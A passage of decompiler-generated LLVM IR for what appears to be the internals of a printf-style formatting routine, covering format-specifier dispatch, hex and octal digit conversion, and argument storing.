dec_label_pc_80520ce.dec_label_pc_8052122_crit_edge: ; preds = %dec_label_pc_80520ce
  %v0_8052122.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052122

dec_label_pc_80520d7:                             ; preds = %dec_label_pc_80520c9
  %v0_8052105 = load i32, i32* @esp, align 4
  br i1 %v2_80520d7, label %dec_label_pc_8052105, label %dec_label_pc_80520db

dec_label_pc_80520db:                             ; preds = %dec_label_pc_80520d7
  %v1_80520db = add i32 %v0_8052105, 7876
  %v2_80520db = inttoptr i32 %v1_80520db to i32*
  %v3_80520db = load i32, i32* %v2_80520db, align 4
  store i32 %v3_80520db, i32* @ebx, align 4
  %v3_80520e2 = mul i32 %v0_80520d7, 12
  store i32 %v3_80520e2, i32* %eax.global-to-local, align 4
  %v2_80520e5 = add i32 %v0_8052105, 7872
  %v3_80520e5 = inttoptr i32 %v2_80520e5 to i32*
  %v4_80520e5 = load i32, i32* %v3_80520e5, align 4
  %v5_80520e5 = add i32 %v4_80520e5, %v3_80520e2
  store i32 %v5_80520e5, i32* %eax.global-to-local, align 4
  %v3_80520ec = mul i32 %v0_80520d7, 4
  %v4_80520ec = add i32 %v3_80520db, %v3_80520ec
  %v5_80520ec = inttoptr i32 %v4_80520ec to i32*
  store i32 %v1_80520b0, i32* %v5_80520ec, align 4
  %v0_80520ef = load i32, i32* @esp, align 4
  %v1_80520ef = add i32 %v0_80520ef, 7808
  store i32 %v1_80520ef, i32* %edx.global-to-local, align 4
  %v0_80520f6 = load i32, i32* @ebp, align 4
  %v2_80520f6 = add i32 %v0_80520ef, -4
  %v3_80520f6 = inttoptr i32 %v2_80520f6 to i32*
  store i32 %v0_80520f6, i32* %v3_80520f6, align 4
  %v1_80520f7 = add i32 %v0_80520ef, -8
  %v2_80520f7 = inttoptr i32 %v1_80520f7 to i32*
  store i32 12, i32* %v2_80520f7, align 4
  %v0_80520f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80520f9 = add i32 %v0_80520ef, -12
  %v3_80520f9 = inttoptr i32 %v2_80520f9 to i32*
  store i32 %v0_80520f9, i32* %v3_80520f9, align 4
  %v0_80520fa = load i32, i32* %edx.global-to-local, align 4
  %v2_80520fa = add i32 %v0_80520ef, -16
  %v3_80520fa = inttoptr i32 %v2_80520fa to i32*
  store i32 %v0_80520fa, i32* %v3_80520fa, align 4
  %v6_80520fb = call i32 @memcpy(i8* %v5_80520fb, i32 %v0_8051ddc, i32 %v0_8051dd1)
  store i32 %v6_80520fb, i32* %eax.global-to-local, align 4
  %v0_8052100 = load i32, i32* @esp, align 4
  %v1_8052100 = add i32 %v0_8052100, 16
  br label %dec_label_pc_8052122

dec_label_pc_8052105:                             ; preds = %dec_label_pc_80520d7
  %v1_8052105 = add i32 %v0_8052105, 36
  %v2_8052105 = inttoptr i32 %v1_8052105 to i32*
  %v3_8052105 = load i32, i32* %v2_8052105, align 4
  %v4_8052105 = icmp eq i32 %v3_8052105, 0
  br i1 %v4_8052105, label %dec_label_pc_80533b9, label %dec_label_pc_8052110

dec_label_pc_8052110:                             ; preds = %dec_label_pc_8052105
  %v1_8052110 = add i32 %v0_8052105, 32
  %v2_8052110 = inttoptr i32 %v1_8052110 to i32*
  %v3_8052110 = load i32, i32* %v2_8052110, align 4
  store i32 %v3_8052110, i32* @ecx, align 4
  %v1_8052114 = add i32 %v0_8052105, 7808
  store i32 %v1_8052114, i32* @eax, align 4
  %v0_805211b = call i32 @pop_arg()
  store i32 %v0_805211b, i32* %eax.global-to-local, align 4
  %v0_805212d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805212d

dec_label_pc_8052122:                             ; preds = %dec_label_pc_80520ce.dec_label_pc_8052122_crit_edge, %dec_label_pc_80520db
  %v0_8052122 = phi i32 [ %v0_8052122.pre, %dec_label_pc_80520ce.dec_label_pc_8052122_crit_edge ], [ %v1_8052100, %dec_label_pc_80520db ]
  %v1_8052122 = add i32 %v0_8052122, 36
  %v2_8052122 = inttoptr i32 %v1_8052122 to i32*
  %v3_8052122 = load i32, i32* %v2_8052122, align 4
  %v4_8052122 = icmp eq i32 %v3_8052122, 0
  br i1 %v4_8052122, label %dec_label_pc_8051dfb.backedge, label %dec_label_pc_805212d

dec_label_pc_805212d:                             ; preds = %dec_label_pc_8052122, %dec_label_pc_8052110
  %v1_805213d = phi i32 [ %v0_8052122, %dec_label_pc_8052122 ], [ %v0_805212d.pre, %dec_label_pc_8052110 ]
  %v1_805212d = add i32 %v1_805213d, 7836
  %v2_805212d = inttoptr i32 %v1_805212d to i32*
  %v3_805212d = load i32, i32* %v2_805212d, align 4
  store i32 %v3_805212d, i32* %eax.global-to-local, align 4
  %v1_8052134 = add i32 %v1_805213d, 56
  %v2_8052134 = inttoptr i32 %v1_8052134 to i32*
  %v3_8052134 = load i32, i32* %v2_8052134, align 4
  %v4_8052134 = icmp eq i32 %v3_8052134, 0
  %v1_8052139 = add i32 %v3_805212d, -1
  %v2_8052139 = inttoptr i32 %v1_8052139 to i8*
  %v3_8052139 = load i8, i8* %v2_8052139, align 1
  %v4_8052139 = sext i8 %v3_8052139 to i32
  store i32 %v4_8052139, i32* %eax.global-to-local, align 4
  %v2_805213d = add i32 %v1_805213d, 68
  %v3_805213d = inttoptr i32 %v2_805213d to i32*
  store i32 %v4_8052139, i32* %v3_805213d, align 4
  br i1 %v4_8052134, label %dec_label_pc_8052150, label %dec_label_pc_8052143

dec_label_pc_8052143:                             ; preds = %dec_label_pc_805212d
  %v0_8052143 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052143 = urem i32 %v0_8052143, 16
  store i32 %v1_8052143, i32* %eax.global-to-local, align 4
  %v9_8052146 = icmp eq i32 %v1_8052143, 3
  %v1_8052149 = icmp eq i1 %v9_8052146, false
  br i1 %v1_8052149, label %dec_label_pc_8052150, label %dec_label_pc_805214b

dec_label_pc_805214b:                             ; preds = %dec_label_pc_8052143
  %v0_805214b = load i32, i32* @esp, align 4
  %v1_805214b = add i32 %v0_805214b, 68
  %v2_805214b = inttoptr i32 %v1_805214b to i32*
  %v3_805214b = load i32, i32* %v2_805214b, align 4
  %v4_805214b = and i32 %v3_805214b, -33
  store i32 %v4_805214b, i32* %v2_805214b, align 4
  br label %dec_label_pc_8052150

dec_label_pc_8052150:                             ; preds = %dec_label_pc_8052143, %dec_label_pc_805212d, %dec_label_pc_805214b
  %v0_8052150 = load i32, i32* @esp, align 4
  %v1_8052150 = add i32 %v0_8052150, 44
  %v2_8052150 = inttoptr i32 %v1_8052150 to i32*
  %v3_8052150 = load i32, i32* %v2_8052150, align 4
  %v4_8052150 = and i32 %v3_8052150, 8192
  %v5_8052150 = icmp eq i32 %v4_8052150, 0
  br i1 %v5_8052150, label %dec_label_pc_8052162, label %dec_label_pc_805215a

dec_label_pc_805215a:                             ; preds = %dec_label_pc_8052150
  %v4_805215a = and i32 %v3_8052150, -65537
  store i32 %v4_805215a, i32* %v2_8052150, align 4
  %v0_8052162.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052162

dec_label_pc_8052162:                             ; preds = %dec_label_pc_8052150, %dec_label_pc_805215a
  %v0_8052513 = phi i32 [ %v0_8052150, %dec_label_pc_8052150 ], [ %v0_8052162.pre, %dec_label_pc_805215a ]
  %v1_8052162 = add i32 %v0_8052513, 68
  %v2_8052162 = inttoptr i32 %v1_8052162 to i32*
  %v3_8052162 = load i32, i32* %v2_8052162, align 4
  %v1_8052166 = add i32 %v3_8052162, -65
  store i32 %v1_8052166, i32* %eax.global-to-local, align 4
  switch i32 %v3_8052162, label %dec_label_pc_805326d [
    i32 65, label %dec_label_pc_805250c
    i32 67, label %dec_label_pc_8052459
    i32 69, label %dec_label_pc_805250c
    i32 70, label %dec_label_pc_805250c
    i32 71, label %dec_label_pc_805250c
    i32 83, label %dec_label_pc_8052488
    i32 88, label %dec_label_pc_805221c
    i32 97, label %dec_label_pc_805250c
    i32 99, label %dec_label_pc_80523d7
    i32 100, label %dec_label_pc_80522ec
    i32 101, label %dec_label_pc_805250c
    i32 102, label %dec_label_pc_805250c
    i32 103, label %dec_label_pc_805250c
    i32 105, label %dec_label_pc_80522ec
    i32 109, label %dec_label_pc_8052401
    i32 110, label %dec_label_pc_8052179
    i32 111, label %dec_label_pc_805228e
    i32 112, label %dec_label_pc_8052200
    i32 115, label %dec_label_pc_8052415
    i32 117, label %dec_label_pc_805234a
  ]

dec_label_pc_8052179:                             ; preds = %dec_label_pc_8052162
  %v1_8052179 = add i32 %v0_8052513, 56
  %v2_8052179 = inttoptr i32 %v1_8052179 to i32*
  %v3_8052179 = load i32, i32* %v2_8052179, align 4
  store i32 %v3_8052179, i32* %esi.global-to-local, align 4
  switch i32 %v0_8052513, label %dec_label_pc_8051dfb.backedge [
    i32 0, label %dec_label_pc_805218f
    i32 1, label %dec_label_pc_80521a1
    i32 2, label %dec_label_pc_80521ea
    i32 3, label %dec_label_pc_80521b3
    i32 4, label %dec_label_pc_80521c6
    i32 6, label %dec_label_pc_80521d8
  ]

dec_label_pc_805218f:                             ; preds = %dec_label_pc_8052179
  %v3_805218f = load i32, i32* inttoptr (i32 7808 to i32*), align 128
  store i32 %v3_805218f, i32* %eax.global-to-local, align 4
  %v3_8052196 = load i32, i32* inttoptr (i32 60 to i32*), align 4
  store i32 %v3_8052196, i32* %edx.global-to-local, align 4
  %v2_805219a = inttoptr i32 %v3_805218f to i32*
  store i32 %v3_8052196, i32* %v2_805219a, align 4
  br label %dec_label_pc_8051dfb.backedge

dec_label_pc_80521a1:                             ; preds = %dec_label_pc_8052179
  %v3_80521a1 = load i32, i32* inttoptr (i32 7809 to i32*), align 4
  store i32 %v3_80521a1, i32* %eax.global-to-local, align 4
  %v3_80521a8 = load i32, i32* inttoptr (i32 61 to i32*), align 4
  store i32 %v3_80521a8, i32* %ecx.global-to-local, align 4
  %v2_80521ac = inttoptr i32 %v3_80521a1 to i32*
  store i32 %v3_80521a8, i32* %v2_80521ac, align 4
  br label %dec_label_pc_8051dfb.backedge

dec_label_pc_80521b3:                             ; preds = %dec_label_pc_8052179
  %v3_80521b3 = load i32, i32* inttoptr (i32 7811 to i32*), align 4
  store i32 %v3_80521b3, i32* %eax.global-to-local, align 4
  %v3_80521ba = load i32, i32* inttoptr (i32 63 to i32*), align 4
  store i32 %v3_80521ba, i32* %edx.global-to-local, align 4
  %v1_80521be = trunc i32 %v3_80521ba to i16
  %v3_80521be = inttoptr i32 %v3_80521b3 to i16*
  store i16 %v1_80521be, i16* %v3_80521be, align 2
  br label %dec_label_pc_8051dfb.backedge

dec_label_pc_80521c6:                             ; preds = %dec_label_pc_8052179
  %v3_80521c6 = load i32, i32* inttoptr (i32 7812 to i32*), align 4
  store i32 %v3_80521c6, i32* %eax.global-to-local, align 4
  %v3_80521cd = load i8, i8* inttoptr (i32 64 to i8*), align 64
  %v4_80521cd = zext i8 %v3_80521cd to i32
  %v5_80521cd = load i32, i32* @ecx, align 4
  %v6_80521cd = and i32 %v5_80521cd, -256
  %v7_80521cd = or i32 %v6_80521cd, %v4_80521cd
  store i32 %v7_80521cd, i32* %ecx.global-to-local, align 4
  %v3_80521d1 = inttoptr i32 %v3_80521c6 to i8*
  store i8 %v3_80521cd, i8* %v3_80521d1, align 1
  br label %dec_label_pc_8051dfb.backedge

dec_label_pc_80521d8:                             ; preds = %dec_label_pc_8052179
  %v3_80521d8 = load i32, i32* inttoptr (i32 7814 to i32*), align 4
  store i32 %v3_80521d8, i32* %eax.global-to-local, align 4
  %v3_80521df = load i32, i32* inttoptr (i32 66 to i32*), align 4
  store i32 %v3_80521df, i32* @ebx, align 4
  %v2_80521e3 = inttoptr i32 %v3_80521d8 to i32*
  store i32 %v3_80521df, i32* %v2_80521e3, align 4
  br label %dec_label_pc_8051dfb.backedge

dec_label_pc_80521ea:                             ; preds = %dec_label_pc_8052179
  %v3_80521ea = load i32, i32* inttoptr (i32 62 to i32*), align 4
  store i32 %v3_80521ea, i32* %eax.global-to-local, align 4
  %v3_80521ee = load i32, i32* inttoptr (i32 7810 to i32*), align 4
  store i32 %v3_80521ee, i32* %ecx.global-to-local, align 4
  %v1_80521f5 = ashr i32 %v3_80521ea, 31
  store i32 %v1_80521f5, i32* %edx.global-to-local, align 4
  %v2_80521f6 = inttoptr i32 %v3_80521ee to i32*
  store i32 %v3_80521ea, i32* %v2_80521f6, align 4
  %v0_80521f8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80521f8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80521f8 = add i32 %v1_80521f8, 4
  %v3_80521f8 = inttoptr i32 %v2_80521f8 to i32*
  store i32 %v0_80521f8, i32* %v3_80521f8, align 4
  br label %dec_label_pc_8051dfb.backedge

dec_label_pc_8052200:                             ; preds = %dec_label_pc_8052162
  %v1_8052200 = add i32 %v0_8052513, 52
  %v2_8052200 = inttoptr i32 %v1_8052200 to i32*
  %v3_8052200 = load i32, i32* %v2_8052200, align 4
  %v8_8052200 = icmp ult i32 %v3_8052200, 8
  %v1_8052205 = icmp eq i1 %v8_8052200, false
  br i1 %v1_8052205, label %dec_label_pc_805220f, label %dec_label_pc_8052207

dec_label_pc_8052207:                             ; preds = %dec_label_pc_8052200
  store i32 8, i32* %v2_8052200, align 4
  %v0_805220f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805220f

dec_label_pc_805220f:                             ; preds = %dec_label_pc_8052200, %dec_label_pc_8052207
  %v10_805220f = phi i32 [ %v0_8052513, %dec_label_pc_8052200 ], [ %v0_805220f.pre, %dec_label_pc_8052207 ]
  %v1_805220f = add i32 %v10_805220f, 44
  %v2_805220f = inttoptr i32 %v1_805220f to i32*
  %v3_805220f = load i32, i32* %v2_805220f, align 4
  %v4_805220f = or i32 %v3_805220f, 8
  store i32 %v4_805220f, i32* %v2_805220f, align 4
  %v0_8052214 = load i32, i32* @esp, align 4
  %v1_8052214 = add i32 %v0_8052214, 68
  %v2_8052214 = inttoptr i32 %v1_8052214 to i32*
  store i32 120, i32* %v2_8052214, align 4
  %v0_805221c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805221c

dec_label_pc_805221c:                             ; preds = %dec_label_pc_8052162, %dec_label_pc_805220f
  %v0_8052227 = phi i32 [ %v0_8052513, %dec_label_pc_8052162 ], [ %v0_805221c.pre, %dec_label_pc_805220f ]
  %v1_805221c = add i32 %v0_8052227, 68
  %v2_805221c = inttoptr i32 %v1_805221c to i32*
  %v3_805221c = load i32, i32* %v2_805221c, align 4
  store i32 %v3_805221c, i32* %ebx.global-to-local, align 4
  %v1_8052220 = add i32 %v0_8052227, 7527
  store i32 %v1_8052220, i32* @esi, align 4
  %v1_8052227 = add i32 %v0_8052227, 7808
  %v2_8052227 = inttoptr i32 %v1_8052227 to i32*
  %v3_8052227 = load i32, i32* %v2_8052227, align 4
  store i32 %v3_8052227, i32* %edx.global-to-local, align 4
  %v1_805222e = add i32 %v0_8052227, 7812
  %v2_805222e = inttoptr i32 %v1_805222e to i32*
  %v3_805222e = load i32, i32* %v2_805222e, align 4
  store i32 %v3_805222e, i32* %ecx.global-to-local, align 4
  %v1_8052235 = and i32 %v3_805221c, 32
  store i32 %v1_8052235, i32* %ebx.global-to-local, align 4
  %v2_8052253296 = or i32 %v3_805222e, %v3_8052227
  %v3_8052253297 = icmp eq i32 %v2_8052253296, 0
  store i32 %v2_8052253296, i32* %eax.global-to-local, align 4
  %v1_8052255299 = icmp eq i1 %v3_8052253297, false
  br i1 %v1_8052255299, label %dec_label_pc_805223a, label %dec_label_pc_8052257

dec_label_pc_805223a:                             ; preds = %dec_label_pc_805221c, %dec_label_pc_805223a.dec_label_pc_805223a_crit_edge
  %v1_805224d = phi i32 [ %v1_805224d.pre, %dec_label_pc_805223a.dec_label_pc_805223a_crit_edge ], [ %v1_8052235, %dec_label_pc_805221c ]
  %v0_805223c = phi i32 [ %v0_805223c.pre, %dec_label_pc_805223a.dec_label_pc_805223a_crit_edge ], [ %v1_8052220, %dec_label_pc_805221c ]
  %v0_805224a301 = phi i32 [ %v0_8052251.pre, %dec_label_pc_805223a.dec_label_pc_805223a_crit_edge ], [ %v3_805222e, %dec_label_pc_805221c ]
  %v0_8052246300 = phi i32 [ %v1_8052253.pre, %dec_label_pc_805223a.dec_label_pc_805223a_crit_edge ], [ %v3_8052227, %dec_label_pc_805221c ]
  %v1_805223c = add i32 %v0_805223c, -1
  store i32 %v1_805223c, i32* @esi, align 4
  %v1_805223d = urem i32 %v0_8052246300, 16
  store i32 %v1_805223d, i32* %eax.global-to-local, align 4
  %v1_8052240 = or i32 %v1_805223d, 134564368
  %v2_8052240 = inttoptr i32 %v1_8052240 to i8*
  %v3_8052240 = load i8, i8* %v2_8052240, align 1
  %v4_8052240 = zext i8 %v3_8052240 to i32
  %v3_8052246 = udiv i32 %v0_8052246300, 16
  %v4_8052246 = mul i32 %v0_805224a301, 268435456
  %v5_8052246 = or i32 %v4_8052246, %v3_8052246
  store i32 %v5_8052246, i32* %edx.global-to-local, align 4
  %v2_805224a = udiv i32 %v0_805224a301, 16
  store i32 %v2_805224a, i32* %ecx.global-to-local, align 4
  %v2_805224d = or i32 %v1_805224d, %v4_8052240
  %v5_805224d = trunc i32 %v2_805224d to i8
  %v3_805224f = inttoptr i32 %v1_805223c to i8*
  store i8 %v5_805224d, i8* %v3_805224f, align 1
  %v0_8052251.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052253.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_8052253 = or i32 %v0_8052251.pre, %v1_8052253.pre
  %v3_8052253 = icmp eq i32 %v2_8052253, 0
  store i32 %v2_8052253, i32* %eax.global-to-local, align 4
  %v1_8052255 = icmp eq i1 %v3_8052253, false
  br i1 %v1_8052255, label %dec_label_pc_805223a.dec_label_pc_805223a_crit_edge, label %dec_label_pc_8052251.dec_label_pc_8052257_crit_edge

dec_label_pc_805223a.dec_label_pc_805223a_crit_edge: ; preds = %dec_label_pc_805223a
  %v0_805223c.pre = load i32, i32* @esi, align 4
  %v1_805224d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805223a

dec_label_pc_8052251.dec_label_pc_8052257_crit_edge: ; preds = %dec_label_pc_805223a
  %v0_8052257.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052257

dec_label_pc_8052257:                             ; preds = %dec_label_pc_8052251.dec_label_pc_8052257_crit_edge, %dec_label_pc_805221c
  %v0_8052257 = phi i32 [ %v0_8052257.pre, %dec_label_pc_8052251.dec_label_pc_8052257_crit_edge ], [ %v0_8052227, %dec_label_pc_805221c ]
  %v1_8052257 = add i32 %v0_8052257, 7808
  %v2_8052257 = inttoptr i32 %v1_8052257 to i32*
  %v3_8052257 = load i32, i32* %v2_8052257, align 4
  store i32 %v3_8052257, i32* %eax.global-to-local, align 4
  %v2_805225e = add i32 %v0_8052257, 7812
  %v3_805225e = inttoptr i32 %v2_805225e to i32*
  %v4_805225e = load i32, i32* %v3_805225e, align 4
  %v5_805225e = or i32 %v4_805225e, %v3_8052257
  %v6_805225e = icmp eq i32 %v5_805225e, 0
  store i32 %v5_805225e, i32* %eax.global-to-local, align 4
  br i1 %v6_805225e, label %dec_label_pc_80522d7, label %dec_label_pc_8052267

dec_label_pc_8052267:                             ; preds = %dec_label_pc_8052257
  %v1_8052267 = add i32 %v0_8052257, 44
  %v2_8052267 = inttoptr i32 %v1_8052267 to i8*
  %v3_8052267 = load i8, i8* %v2_8052267, align 1
  %v4_8052267 = and i8 %v3_8052267, 8
  %v5_8052267 = icmp eq i8 %v4_8052267, 0
  br i1 %v5_8052267, label %dec_label_pc_80522d7, label %dec_label_pc_805226e

dec_label_pc_805226e:                             ; preds = %dec_label_pc_8052267
  %v1_805226e = add i32 %v0_8052257, 68
  %v2_805226e = inttoptr i32 %v1_805226e to i32*
  %v3_805226e = load i32, i32* %v2_805226e, align 4
  %v5_805226e = sdiv i32 %v3_805226e, 16
  store i32 %v5_805226e, i32* %v2_805226e, align 4
  %v0_8052273 = load i32, i32* @esp, align 4
  %v1_8052273 = add i32 %v0_8052273, 68
  %v2_8052273 = inttoptr i32 %v1_8052273 to i32*
  %v3_8052273 = load i32, i32* %v2_8052273, align 4
  store i32 %v3_8052273, i32* %edx.global-to-local, align 4
  %v1_8052277 = add i32 %v0_8052273, 72
  %v2_8052277 = inttoptr i32 %v1_8052277 to i32*
  store i32 2, i32* %v2_8052277, align 4
  %v0_805227f = load i32, i32* %edx.global-to-local, align 4
  %v1_805227f = add i32 %v0_805227f, 134564384
  store i32 %v1_805227f, i32* %edx.global-to-local, align 4
  %v1_8052285 = load i32, i32* @esp, align 4
  %v2_8052285 = add i32 %v1_8052285, 64
  %v3_8052285 = inttoptr i32 %v2_8052285 to i32*
  store i32 %v1_805227f, i32* %v3_8052285, align 4
  br label %dec_label_pc_8052376

dec_label_pc_805228e:                             ; preds = %dec_label_pc_8052162
  %v1_805228e = add i32 %v0_8052513, 7808
  %v2_805228e = inttoptr i32 %v1_805228e to i32*
  %v3_805228e = load i32, i32* %v2_805228e, align 4
  store i32 %v3_805228e, i32* %edx.global-to-local, align 4
  %v1_8052295 = add i32 %v0_8052513, 7527
  store i32 %v1_8052295, i32* @esi, align 4
  %v1_805229c = add i32 %v0_8052513, 7812
  %v2_805229c = inttoptr i32 %v1_805229c to i32*
  %v3_805229c = load i32, i32* %v2_805229c, align 4
  store i32 %v3_805229c, i32* %ecx.global-to-local, align 4
  %v2_80522b9290 = or i32 %v3_805229c, %v3_805228e
  %v3_80522b9291 = icmp eq i32 %v2_80522b9290, 0
  store i32 %v2_80522b9290, i32* %ebx.global-to-local, align 4
  %v1_80522bb293 = icmp eq i1 %v3_80522b9291, false
  br i1 %v1_80522bb293, label %dec_label_pc_80522a5, label %dec_label_pc_80522bd

dec_label_pc_80522a5:                             ; preds = %dec_label_pc_805228e, %dec_label_pc_80522a5.dec_label_pc_80522a5_crit_edge
  %v0_80522a7 = phi i32 [ %v0_80522a7.pre, %dec_label_pc_80522a5.dec_label_pc_80522a5_crit_edge ], [ %v1_8052295, %dec_label_pc_805228e ]
  %v1_80522ae295 = phi i32 [ %v2_80522b4, %dec_label_pc_80522a5.dec_label_pc_80522a5_crit_edge ], [ %v3_805229c, %dec_label_pc_805228e ]
  %v0_80522ae294 = phi i32 [ %v1_80522b9.pre, %dec_label_pc_80522a5.dec_label_pc_80522a5_crit_edge ], [ %v3_805228e, %dec_label_pc_805228e ]
  %v1_80522a7 = add i32 %v0_80522a7, -1
  store i32 %v1_80522a7, i32* @esi, align 4
  %v1_80522a8 = urem i32 %v0_80522ae294, 8
  %v1_80522ab = or i32 %v1_80522a8, 48
  %v8_80522ab = trunc i32 %v1_80522ab to i8
  store i32 %v1_80522ab, i32* %eax.global-to-local, align 4
  %v3_80522ae = udiv i32 %v0_80522ae294, 8
  %v4_80522ae = mul i32 %v1_80522ae295, 536870912
  %v5_80522ae = or i32 %v4_80522ae, %v3_80522ae
  store i32 %v5_80522ae, i32* %edx.global-to-local, align 4
  %v3_80522b2 = inttoptr i32 %v1_80522a7 to i8*
  store i8 %v8_80522ab, i8* %v3_80522b2, align 1
  %v0_80522b4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80522b4 = udiv i32 %v0_80522b4, 8
  store i32 %v2_80522b4, i32* %ecx.global-to-local, align 4
  %v1_80522b9.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_80522b9 = or i32 %v2_80522b4, %v1_80522b9.pre
  %v3_80522b9 = icmp eq i32 %v2_80522b9, 0
  store i32 %v2_80522b9, i32* %ebx.global-to-local, align 4
  %v1_80522bb = icmp eq i1 %v3_80522b9, false
  br i1 %v1_80522bb, label %dec_label_pc_80522a5.dec_label_pc_80522a5_crit_edge, label %dec_label_pc_80522b7.dec_label_pc_80522bd_crit_edge

dec_label_pc_80522a5.dec_label_pc_80522a5_crit_edge: ; preds = %dec_label_pc_80522a5
  %v0_80522a7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80522a5

dec_label_pc_80522b7.dec_label_pc_80522bd_crit_edge: ; preds = %dec_label_pc_80522a5
  %v0_80522bd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80522bd

dec_label_pc_80522bd:                             ; preds = %dec_label_pc_80522b7.dec_label_pc_80522bd_crit_edge, %dec_label_pc_805228e
  %v0_80522bd = phi i32 [ %v0_80522bd.pre, %dec_label_pc_80522b7.dec_label_pc_80522bd_crit_edge ], [ %v0_8052513, %dec_label_pc_805228e ]
  %v1_80522bd = add i32 %v0_80522bd, 44
  %v2_80522bd = inttoptr i32 %v1_80522bd to i8*
  %v3_80522bd = load i8, i8* %v2_80522bd, align 1
  %v4_80522bd = and i8 %v3_80522bd, 8
  %v5_80522bd = icmp eq i8 %v4_80522bd, 0
  br i1 %v5_80522bd, label %dec_label_pc_80522d7, label %dec_label_pc_80522c4

dec_label_pc_80522c4:                             ; preds = %dec_label_pc_80522bd
  %v1_80522c4 = add i32 %v0_80522bd, 7528
  %v1_80522cb = load i32, i32* @esi, align 4
  %v2_80522cb = sub i32 %v1_80522c4, %v1_80522cb
  store i32 %v2_80522cb, i32* %eax.global-to-local, align 4
  %v1_80522cd = add i32 %v0_80522bd, 52
  %v2_80522cd = inttoptr i32 %v1_80522cd to i32*
  %v3_80522cd = load i32, i32* %v2_80522cd, align 4
  %v5_80522cd = sub i32 %v3_80522cd, %v2_80522cb
  %v11_80522cd = xor i32 %v3_80522cd, %v2_80522cb
  %v12_80522cd = xor i32 %v5_80522cd, %v3_80522cd
  %v13_80522cd = and i32 %v12_80522cd, %v11_80522cd
  %v14_80522cd = icmp slt i32 %v13_80522cd, 0
  %v16_80522cd = icmp slt i32 %v5_80522cd, 0
  %v2_80522d1 = icmp eq i1 %v16_80522cd, %v14_80522cd
  br i1 %v2_80522d1, label %dec_label_pc_80522d7, label %dec_label_pc_80522d3

dec_label_pc_80522d3:                             ; preds = %dec_label_pc_80522c4
  store i32 %v2_80522cb, i32* %v2_80522cd, align 4
  %v0_80522d7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80522d7

dec_label_pc_80522d7:                             ; preds = %dec_label_pc_80522c4, %dec_label_pc_80522bd, %dec_label_pc_8052267, %dec_label_pc_8052257, %dec_label_pc_80522d3
  %v0_80522d7 = phi i32 [ %v0_80522bd, %dec_label_pc_80522c4 ], [ %v0_80522bd, %dec_label_pc_80522bd ], [ %v0_8052257, %dec_label_pc_8052267 ], [ %v0_8052257, %dec_label_pc_8052257 ], [ %v0_80522d7.pre, %dec_label_pc_80522d3 ]
  %v1_80522d7 = add i32 %v0_80522d7, 64
  %v2_80522d7 = inttoptr i32 %v1_80522d7 to i32*
  store i32 ptrtoint ([10 x i8]* @global_var_8054a20.392 to i32), i32* %v2_80522d7, align 4
  %v0_80522df = load i32, i32* @esp, align 4
  %v1_80522df = add i32 %v0_80522df, 72
  %v2_80522df = inttoptr i32 %v1_80522df to i32*
  store i32 0, i32* %v2_80522df, align 4
  br label %dec_label_pc_8052376

dec_label_pc_80522ec:                             ; preds = %dec_label_pc_8052162, %dec_label_pc_8052162
  %v1_80522ec = add i32 %v0_8052513, 7812
  %v2_80522ec = inttoptr i32 %v1_80522ec to i32*
  %v3_80522ec = load i32, i32* %v2_80522ec, align 4
  store i32 %v3_80522ec, i32* %edx.global-to-local, align 4
  %v1_80522f3 = add i32 %v0_8052513, 7808
  %v2_80522f3 = inttoptr i32 %v1_80522f3 to i32*
  %v3_80522f3 = load i32, i32* %v2_80522f3, align 4
  store i32 %v3_80522f3, i32* %eax.global-to-local, align 4
  %v2_80522fa = icmp slt i32 %v3_80522ec, 0
  %v1_80522fc = icmp eq i1 %v2_80522fa, false
  br i1 %v1_80522fc, label %dec_label_pc_805231d, label %dec_label_pc_80522fe

dec_label_pc_80522fe:                             ; preds = %dec_label_pc_80522ec
  %v1_80522fe = sub i32 0, %v3_80522f3
  %v5_80522fe = icmp ne i32 %v3_80522f3, 0
  store i32 %v1_80522fe, i32* %eax.global-to-local, align 4
  %v2_8052300 = zext i1 %v5_80522fe to i32
  %v3_8052300 = add i32 %v2_8052300, %v3_80522ec
  %v1_8052303 = sub i32 0, %v3_8052300
  store i32 %v1_8052303, i32* %edx.global-to-local, align 4
  store i32 %v1_80522fe, i32* %v2_80522f3, align 4
  %v0_805230c = load i32, i32* %edx.global-to-local, align 4
  %v1_805230c = load i32, i32* @esp, align 4
  %v2_805230c = add i32 %v1_805230c, 7812
  %v3_805230c = inttoptr i32 %v2_805230c to i32*
  store i32 %v0_805230c, i32* %v3_805230c, align 4
  %v0_8052313 = load i32, i32* @esp, align 4
  %v1_8052313 = add i32 %v0_8052313, 64
  %v2_8052313 = inttoptr i32 %v1_8052313 to i32*
  store i32 ptrtoint ([10 x i8]* @global_var_8054a20.392 to i32), i32* %v2_8052313, align 4
  br label %dec_label_pc_8052340

dec_label_pc_805231d:                             ; preds = %dec_label_pc_80522ec
  %v1_805231d = add i32 %v0_8052513, 44
  %v2_805231d = inttoptr i32 %v1_805231d to i32*
  %v3_805231d = load i32, i32* %v2_805231d, align 4
  %v4_805231d = and i32 %v3_805231d, 2048
  %v5_805231d = icmp eq i32 %v4_805231d, 0
  br i1 %v5_805231d, label %dec_label_pc_8052331, label %dec_label_pc_8052327

dec_label_pc_8052327:                             ; preds = %dec_label_pc_805231d
  %v1_8052327 = add i32 %v0_8052513, 64
  %v2_8052327 = inttoptr i32 %v1_8052327 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8054a21.393 to i32), i32* %v2_8052327, align 4
  br label %dec_label_pc_8052340

dec_label_pc_8052331:                             ; preds = %dec_label_pc_805231d
